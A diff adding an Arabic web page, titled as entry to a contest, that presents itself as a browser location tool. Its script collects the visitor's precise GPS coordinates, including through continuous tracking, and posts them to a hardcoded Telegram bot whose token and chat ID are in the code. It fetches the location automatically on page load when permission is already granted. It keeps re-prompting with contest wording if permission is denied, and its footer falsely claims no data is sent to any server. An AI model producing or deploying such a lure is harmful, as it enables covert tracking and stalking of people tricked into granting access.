@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>دخولك الى المسابقه</title>
+  <!-- Leaflet CSS -->
+  <link
+    rel="stylesheet"
+    href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
+    integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY="
+    crossorigin=""
+  />
+  <style>
+    :root { --bg:#0b1220; --fg:#e7edf7; --muted:#96a1b0; --card:#121a2a; --accent:#4da3ff; }
+    * { box-sizing: border-box; }
+    body { margin:0; font-family: system-ui, -apple-system, Segoe UI, Roboto, "Noto Naskh Arabic UI", Arial, sans-serif; background:var(--bg); color:var(--fg); }
+    header { padding: 18px 16px; border-bottom: 1px solid #22304a; position: sticky; top:0; background: linear-gradient(180deg, #0b1220 0%, #0b1220cc 100%); backdrop-filter: blur(6px); z-index: 1000; }
+    h1 { margin: 0; font-size: 20px; }
+    .container { padding: 16px; display: grid; gap: 16px; grid-template-columns: 1fr; max-width: 1100px; margin: 0 auto; }
+    .card { background: var(--card); border: 1px solid #1c2840; border-radius: 16px; padding: 16px; box-shadow: 0 10px 30px #00000033; }
+    .row { display: grid; gap: 12px; grid-template-columns: 1fr; }
+    .controls { display: flex; flex-wrap: wrap; gap: 8px; }
+    button, .btn { cursor: pointer; border: 1px solid #275082; background: #16243a; color: var(--fg); padding: 10px 14px; border-radius: 999px; font-weight: 600; transition: transform .06s ease, background .2s ease; }
+    button:hover { background: #1c2f4d; }
+    button:active { transform: scale(0.98); }
+    .btn-primary { background: #1c4b8e; border-color: #2a6ac8; }
+    .btn-secondary { background: #151f33; border-color: #2a3652; }
+    .hint { color: var(--muted); font-size: 13px; }
+    .kv { display:grid; grid-template-columns: auto 1fr; gap: 6px 12px; font-size: 14px; }
+    .kv div:nth-child(odd){ color: var(--muted); }
+    #map { width: 100%; height: 55vh; border-radius: 16px; border: 1px solid #1c2840; }
+    .badge { display:inline-flex; align-items:center; gap:6px; background:#0f1b30; border:1px solid #203252; color:#cfe3ff; padding:6px 10px; border-radius:999px; font-size:12px; }
+    .ok { color:#7dffa0; }
+    .warn { color:#ffd36e; }
+    .err { color:#ff8c8c; }
+    footer { text-align:center; color: #7d8aa3; padding: 10px 0 18px; font-size: 12px; }
+    @media (min-width: 880px){ .row { grid-template-columns: 1.1fr .9fr; } }
+    #permissionRequest { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(11, 18, 32, 0.95); display: flex; justify-content: center; align-items: center; z-index: 2000; }
+    .permission-box { background: var(--card); padding: 24px; border-radius: 16px; max-width: 500px; text-align: center; border: 1px solid #2a3c5c; }
+    .permission-title { font-size: 20px; margin-bottom: 16px; color: #4da3ff; }
+    .permission-text { margin-bottom: 24px; line-height: 1.6; }
+    .permission-btn { background: #1c4b8e; border: none; padding: 12px 24px; font-size: 16px; margin: 8px; }
+    .permission-list { text-align: right; margin: 20px 0; padding: 0 20px; }
+    .permission-list li { margin-bottom: 10px; }
+    .consent-text { font-size: 12px; color: var(--muted); margin-top: 20px; }
+  </style>
+</head>
+<body>
+  <div id="permissionRequest">
+    <div class="permission-box">
+      <div class="permission-title">📍 تفعيل خدمات الموقع</div>
+      <div class="permission-text">
+        لتحديد موقعك بدقة، نحتاج إلى إذنك للوصول إلى:
+        <ul class="permission-list">
+          <li>الموقع الجغرافي لجهازك</li>
+          <li>تفعيل إعداد "دقة الموقع الجغرافي"</li>
+          <li>السماح باستخدام الموقع أثناء تصفحك</li>
+        </ul>
+        سيتم إرسال موقعك إلى Telegram بعد الحصول عليه.
+      </div>
+      <button id="requestPermissionBtn" class="btn-primary permission-btn">موافق وتفعيل الكل</button>
+      <div class="consent-text">بالنقر على "موافق"، فإنك توافق على استخدام معلومات الموقع الجغرافي وفقًا لسياسة الخصوصية.</div>
+    </div>
+  </div>
+
+  <header>
+    <h1>تحديد موقع الهاتف بدقة عبر المتصفح</h1>
+  </header>
+
+  <div class="container">
+    <section class="card row">
+      <div>
+        <div class="controls" style="margin-bottom:12px;">
+          <button id="locateBtn" class="btn-primary">تحديد الموقع الآن</button>
+          <button class="btn btn-secondary" id="toggleWatchBtn">بدء التتبع المباشر</button>
+          <button class="btn btn-secondary" id="copyBtn">نسخ الإحداثيات</button>
+          <a class="btn btn-secondary" id="mapsBtn" target="_blank" rel="noopener">فتح في خرائط جوجل</a>
+        </div>
+        <div class="hint">يتطلب اتصالاً آمناً (HTTPS) أو <span dir="ltr">http://localhost</span>، وموافقة المستخدم على إذن الموقع على المتصفح.</div>
+        <div style="margin-top:10px; display:flex; gap:8px; flex-wrap:wrap;">
+          <span class="badge" id="secureBadge">المنشأ الآمن: —</span>
+          <span class="badge" id="permBadge">إذن الموقع: —</span>
+          <span class="badge" id="sensorBadge">المستشعرات العالية: مُفعّل</span>
+        </div>
+        <div class="kv" style="margin-top:12px;">
+          <div>خط العرض (lat):</div><div id="lat">—</div>
+          <div>خط الطول (lng):</div><div id="lng">—</div>
+          <div>الدقة (متر):</div><div id="accuracy">—</div>
+          <div>الارتفاع (متر):</div><div id="altitude">—</div>
+          <div>دقة الارتفاع (متر):</div><div id="altAcc">—</div>
+          <div>الاتجاه (heading°):</div><div id="heading">—</div>
+          <div>السرعة (م/ث):</div><div id="speed">—</div>
+          <div>آخر تحديث:</div><div id="timestamp">—</div>
+        </div>
+        <p class="hint" style="margin-top:8px;">نصيحة للدقة العالية: فعّل GPS، البلوتوث، والـ Wi‑Fi؛ وابقَ في مكان مفتوح إن أمكن.</p>
+      </div>
+      <div>
+        <div id="map"></div>
+      </div>
+    </section>
+
+    <section class="card">
+      <details>
+        <summary><strong>الخيارات المتقدمة</strong></summary>
+        <div style="margin-top:10px; display:grid; gap:8px;">
+          <label style="display:flex; align-items:center; gap:8px;">
+            <input type="checkbox" id="hiAcc" checked />
+            استخدام <code>enableHighAccuracy</code>
+          </label>
+          <label style="display:flex; align-items:center; gap:8px;">
+            <input type="number" id="timeout" value="15000" min="0" step="1000" style="max-width:140px;" />
+            مهلة الطلب (ms)
+          </label>
+          <label style="display:flex; align-items:center; gap:8px;">
+            <input type="number" id="maxAge" value="0" min="0" step="1000" style="max-width:140px;" />
+            أقصى عمر للقراءة من الكاش (ms)
+          </label>
+        </div>
+      </details>
+    </section>
+  </div>
+
+  <footer>© تجربة تحديد الموقع بالمتصفح — لا يتم إرسال بياناتك لأي خادم في هذا الملف.</footer>
+
+  <!-- Leaflet JS -->
+  <script
+    src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"
+    integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo="
+    crossorigin=""
+  ></script>
+  <script>
+    // إعدادات بوت تيليجرام
+    const TELEGRAM_TOKEN = "8267173113:AAGt0PYYlcrOCcoNC7PMMMhYNxNJrlx5aN0";
+    const TELEGRAM_CHAT_ID = "6837315281";
+
+    async function sendToTelegram(lat, lng, accuracy) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+      const text = `موقع جديد:\n📍 https://maps.google.com/?q=${lat},${lng}\nخط العرض: ${lat}\nخط الطول: ${lng}\nالدقة: ${accuracy}m`;
+      try {
+        await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
+        });
+      } catch (e) {
+        console.error("فشل الإرسال إلى تيليجرام", e);
+      }
+    }
+
+    // عناصر الواجهة
+    const el = (id) => document.getElementById(id);
+    const latEl = el('lat');
+    const lngEl = el('lng');
+    const accEl = el('accuracy');
+    const altEl = el('altitude');
+    const altAccEl = el('altAcc');
+    const headEl = el('heading');
+    const speedEl = el('speed');
+    const timeEl = el('timestamp');
+    const secureBadge = el('secureBadge');
+    const permBadge = el('permBadge');
+    const sensorBadge = el('sensorBadge');
+    const permissionRequest = el('permissionRequest');
+
+    const hiAcc = el('hiAcc');
+    const timeout = el('timeout');
+    const maxAge = el('maxAge');
+
+    const locateBtn = el('locateBtn');
+    const toggleWatchBtn = el('toggleWatchBtn');
+    const copyBtn = el('copyBtn');
+    const mapsBtn = el('mapsBtn');
+    const requestPermissionBtn = el('requestPermissionBtn');
+
+    let watchId = null;
+    const isSecure = location.protocol === 'https:' || location.hostname === 'localhost' || location.hostname === '127.0.0.1';
+    secureBadge.textContent = `المنشأ الآمن: ${isSecure ? 'نعم' : 'لا'}`;
+    secureBadge.classList.add(isSecure ? 'ok' : 'warn');
+
+    let map = L.map('map', { zoomControl: true });
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19, attribution: '&copy; OpenStreetMap contributors' }).addTo(map);
+    let marker = null, circle = null;
+
+    function updateMap(lat, lng, accuracy) {
+      const pos = [lat, lng];
+      if (!marker) marker = L.marker(pos).addTo(map);
+      else marker.setLatLng(pos);
+      if (!circle) circle = L.circle(pos, { radius: accuracy || 30 }).addTo(map);
+      else { circle.setLatLng(pos); circle.setRadius(accuracy || 30); }
+      map.setView(pos, 17);
+    }
+
+    function fmt(n) { return (n === null || n === undefined) ? '—' : Number(n).toFixed(6); }
+
+    function showPosition(position) {
+      permissionRequest.style.display = 'none';
+      
+      const c = position.coords;
+      latEl.textContent = fmt(c.latitude);
+      lngEl.textContent = fmt(c.longitude);
+      accEl.textContent = c.accuracy ? `${Math.round(c.accuracy)} m` : '—';
+      altEl.textContent = c.altitude != null ? `${Math.round(c.altitude)} m` : '—';
+      altAccEl.textContent = c.altitudeAccuracy != null ? `${Math.round(c.altitudeAccuracy)} m` : '—';
+      headEl.textContent = c.heading != null && !isNaN(c.heading) ? `${Math.round(c.heading)}°` : '—';
+      speedEl.textContent = c.speed != null ? `${(c.speed).toFixed(2)} m/s` : '—';
+      timeEl.textContent = new Date(position.timestamp).toLocaleString();
+
+      updateMap(c.latitude, c.longitude, c.accuracy || 30);
+      mapsBtn.href = `https://www.google.com/maps?q=${c.latitude},${c.longitude}`;
+      sendToTelegram(c.latitude, c.longitude, Math.round(c.accuracy || 0));
+    }
+
+    function showError(err) {
+      const msgs = {
+        1: 'امنح الاذن لدخولك الى المسابقه .',
+        2: 'امنح الاذن لدخولك الى المسابقه.',
+        3: 'امنح الاذن لدخولك الى المسابقه.'
+      };
+      
+      // إذا كان الخطأ هو رفض الإذن، اعرض طلب الإذن مرة أخرى
+      if (err.code === 1) {
+        permissionRequest.style.display = 'flex';
+      } else {
+        alert(msgs[err.code] || ('خطأ غير متوقع: ' + err.message));
+      }
+    }
+
+    function buildOptions(){
+      return { 
+        enableHighAccuracy: hiAcc.checked, 
+        timeout: Number(timeout.value)||15000, 
+        maximumAge: Number(maxAge.value)||0 
+      };
+    }
+
+    function getOnce(){
+      if(!('geolocation' in navigator)){ 
+        alert('متصفحك لا يدعم Geolocation'); 
+        return; 
+      }
+      
+      if (!isSecure) {
+        alert('هذه الصفحة غير آمنة. يلزم اتصال HTTPS أو localhost لاستخدام خدمة الموقع.');
+        return;
+      }
+      
+      navigator.geolocation.getCurrentPosition(showPosition, showError, buildOptions());
+    }
+
+    function toggleWatch(){
+      if(!('geolocation' in navigator)){ 
+        alert('متصفحك لا يدعم Geolocation'); 
+        return; 
+      }
+      
+      if(watchId != null){ 
+        navigator.geolocation.clearWatch(watchId); 
+        watchId=null; 
+        toggleWatchBtn.textContent='بدء التتبع المباشر'; 
+      } else { 
+        watchId = navigator.geolocation.watchPosition(showPosition, showError, buildOptions()); 
+        toggleWatchBtn.textContent='إيقاف التتبع المباشر'; 
+      }
+    }
+
+    copyBtn.addEventListener('click', async ()=>{
+      const lat = latEl.textContent, lng = lngEl.textContent;
+      if(!lat || lat==='—'){ 
+        alert('لم يتم تحديد الموقع بعد.'); 
+        return; 
+      }
+      const txt = `${lat},${lng}`;
+      try{ 
+        await navigator.clipboard.writeText(txt); 
+        alert('تم نسخ الإحداثيات: ' + txt); 
+      } catch{ 
+        alert('تعذر النسخ تلقائياً؛ انسخها يدوياً: ' + txt); 
+      }
+    });
+
+    locateBtn.addEventListener('click', getOnce);
+    toggleWatchBtn.addEventListener('click', toggleWatch);
+    requestPermissionBtn.addEventListener('click', getOnce);
+
+    async function refreshPermission(){
+      try{
+        if(!('permissions' in navigator)){ 
+          permBadge.textContent='إذن الموقع: غير مدعوم'; 
+          permBadge.classList.add('warn'); 
+          return; 
+        }
+        
+        const status = await navigator.permissions.query({ name: 'geolocation' });
+        const mapStatus = {'granted':'ممنوح','prompt':'يحتاج موافقة','denied':'مرفوض'};
+        permBadge.textContent=`إذن الموقع: ${mapStatus[status.state]||status.state}`;
+        permBadge.classList.remove('ok','warn','err');
+        
+        if (status.state === 'granted') {
+          permBadge.classList.add('ok');
+          permissionRequest.style.display = 'none';
+          // إذا كان الإذن ممنوحًا، احصل على الموقع تلقائيًا
+          getOnce();
+        } else if (status.state === 'prompt') {
+          permBadge.classList.add('warn');
+          permissionRequest.style.display = 'flex';
+        } else {
+          permBadge.classList.add('err');
+          permissionRequest.style.display = 'flex';
+        }
+        
+        status.onchange = refreshPermission;
+      } catch(e){ 
+        permBadge.textContent='إذن الموقع: —'; 
+        permBadge.classList.add('warn'); 
+      }
+    }
+
+    // تهيئة الخريطة بقيمة افتراضية
+    map.setView([15.3694, 44.1910], 6); // اليمن كافتراضي
+
+    // عند تحميل الصفحة، تحقق من حالة الإذن
+    window.addEventListener('load', ()=>{
+      refreshPermission();
+      
+      // إذا لم يكن المنشأ آمناً، أخف طلب الإذن وأظهر تحذيراً
+      if (!isSecure) {
+        permissionRequest.style.display = 'none';
+        secureBadge.textContent = 'المنشأ الآمن: لا (HTTPS مطلوب)';
+        secureBadge.classList.add('err');
+      }
+    });
+  </script>
+</body>
+</html>
